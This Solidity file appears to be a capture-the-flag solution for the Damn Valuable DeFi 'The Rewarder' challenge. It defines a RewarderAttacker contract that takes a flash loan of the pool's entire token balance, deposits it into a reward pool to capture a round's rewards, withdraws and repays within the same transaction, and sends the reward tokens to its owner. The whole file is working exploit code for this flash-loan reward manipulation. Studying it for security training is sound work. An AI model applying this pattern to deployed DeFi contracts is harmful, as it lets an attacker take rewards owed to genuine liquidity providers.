// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../the-rewarder/RewardToken.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/FlashLoanerPool.sol";

contract RewarderAttacker {
    FlashLoanerPool flashLoanPool;
    TheRewarderPool rewarderPool;
    DamnValuableToken liquidityToken;
    RewardToken rewardToken;

    address owner;

    constructor(
        DamnValuableToken _liquidityToken,
        FlashLoanerPool _flashLoanPool,
        TheRewarderPool _rewarderPool,
        RewardToken _rewardToken
    ) {
        owner = msg.sender;
        liquidityToken = _liquidityToken;
        flashLoanPool = _flashLoanPool;
        rewarderPool = _rewarderPool;
        rewardToken = _rewardToken;
    }

    function receiveFlashLoan(uint256 borrowAmount) external {
        require(msg.sender == address(flashLoanPool), "only pool");

        liquidityToken.approve(address(rewarderPool), borrowAmount);

        // theorically depositing DVT call already distribute reward if the next round has already started
        rewarderPool.deposit(borrowAmount);

        // we can now withdraw everything
        rewarderPool.withdraw(borrowAmount);

        // we send back the borrowed tocken
        bool payedBorrow = liquidityToken.transfer(
            address(flashLoanPool),
            borrowAmount
        );
        require(payedBorrow, "Borrow not payed back");

        // we transfer the rewarded RewardToken to the contract's owner
        uint256 rewardBalance = rewardToken.balanceOf(address(this));
        bool rewardSent = rewardToken.transfer(owner, rewardBalance);

        require(rewardSent, "Reward not sent back to the contract's owner");
    }

    function attack() external {
        require(msg.sender == owner, "only owner");

        uint256 dvtPoolBalance = liquidityToken.balanceOf(
            address(flashLoanPool)
        );
        flashLoanPool.flashLoan(dvtPoolBalance);
    }
}
